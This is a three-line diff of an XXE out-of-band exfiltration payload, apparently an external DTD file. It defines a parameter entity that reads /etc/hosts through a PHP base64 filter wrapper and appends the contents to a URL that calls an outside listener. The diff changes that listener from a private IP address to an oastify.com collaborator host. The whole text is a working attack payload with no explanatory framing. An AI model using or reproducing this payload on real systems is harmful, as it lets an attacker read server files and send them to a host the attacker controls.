@@ -1,3 +1,3 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
-<!ENTITY % tmp "<!ENTITY oob SYSTEM 'http://172.20.2.68:8082/dtd.xml?%data;'>">
+<!ENTITY % tmp "<!ENTITY oob SYSTEM 'http://c4hzne93gqt9uu2nijkepfi31u7lvbj0.oastify.com?%data;'>">
 %tmp;
